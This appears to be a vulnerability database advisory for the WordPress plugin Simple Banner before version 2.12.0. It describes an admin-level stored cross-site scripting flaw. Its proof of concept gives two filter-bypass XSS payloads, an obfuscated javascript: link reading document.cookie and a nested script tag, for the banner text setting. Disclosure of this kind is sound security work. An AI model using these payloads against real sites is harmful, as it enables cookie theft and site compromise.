## WordPress Plugin Vulnerabilities

# Simple Banner < 2.12.0 - Admin+ Stored Cross Site Scripting

### Description

The plugin does not properly sanitize its "Simple Banner Text" Settings allowing high privilege users to perform Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed.

### Proof of Concept

Put the following payloads in the "Simple Banner Text" settings of the plugin:
<a href="jav&#x09;ascript&colon;alert(document.cookie)">Firefox</a>
<sc<script>ript>alert(/XSS/)</scr</script>ipt>
Then access the frontend to trigger the XSS
